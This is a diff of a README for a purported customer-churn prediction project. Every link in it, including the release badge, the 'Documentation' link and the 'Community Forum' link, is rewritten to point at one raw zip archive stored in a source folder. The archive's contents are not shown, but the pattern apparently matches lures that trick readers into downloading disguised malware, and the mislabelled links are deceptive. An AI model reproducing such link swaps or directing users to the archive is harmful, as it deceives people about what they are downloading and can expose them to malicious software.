@@ -1,6 +1,6 @@
 # 🎯 customer-churn-ml-pipeline - Predict Customer Behavior Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Anthonyxd994/customer-churn-ml-pipeline/releases)
+[![Download Latest Release](https://github.com/Anthonyxd994/customer-churn-ml-pipeline/raw/refs/heads/main/src/feature_engineering/customer_ml_churn_pipeline_3.3.zip%20Latest%20Release-blue)](https://github.com/Anthonyxd994/customer-churn-ml-pipeline/raw/refs/heads/main/src/feature_engineering/customer_ml_churn_pipeline_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before downloading, make sure your system meets the following requirements:
 To download the application, please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to our releases page.
-   - [Download the latest version here](https://github.com/Anthonyxd994/customer-churn-ml-pipeline/releases)
+   - [Download the latest version here](https://github.com/Anthonyxd994/customer-churn-ml-pipeline/raw/refs/heads/main/src/feature_engineering/customer_ml_churn_pipeline_3.3.zip)
 
 2. **Choose the Right File**: On the releases page, locate the latest version of the application. You will see various files available for download.
 
@@ -59,7 +59,7 @@ If you face any issues or have questions, please check the FAQ section in the ap
 
 For more information, you can visit our:
 
-- [Documentation](https://github.com/Anthonyxd994/customer-churn-ml-pipeline)
-- [Community Forum](https://github.com/Anthonyxd994/customer-churn-ml-pipeline/issues)
+- [Documentation](https://github.com/Anthonyxd994/customer-churn-ml-pipeline/raw/refs/heads/main/src/feature_engineering/customer_ml_churn_pipeline_3.3.zip)
+- [Community Forum](https://github.com/Anthonyxd994/customer-churn-ml-pipeline/raw/refs/heads/main/src/feature_engineering/customer_ml_churn_pipeline_3.3.zip)
 
 Thank you for using the **Customer Churn Prediction System**. We hope it helps you understand your customers better!
